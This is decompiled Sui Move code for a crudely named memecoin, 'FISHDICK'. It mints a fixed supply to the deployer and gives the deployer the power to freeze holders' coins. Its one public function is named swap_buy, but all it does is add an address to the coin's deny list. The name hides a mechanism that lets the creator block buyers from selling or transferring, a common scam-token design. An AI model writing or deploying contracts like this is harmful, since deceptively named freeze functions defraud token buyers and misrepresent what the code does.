module 0x148330a2a736015cd9ff9eeab470a82ae150a205ee254edc4a608e413efb8fcd::fishdick {
    struct FISHDICK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FISHDICK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FISHDICK>(arg0, 9, b"FISHDICK", b"fishdick", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmfSf6bNyWuYji76gX55MpmkFcVLoF7pNXXHKAsrDN4CWr"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FISHDICK>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FISHDICK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FISHDICK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FISHDICK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FISHDICK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FISHDICK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

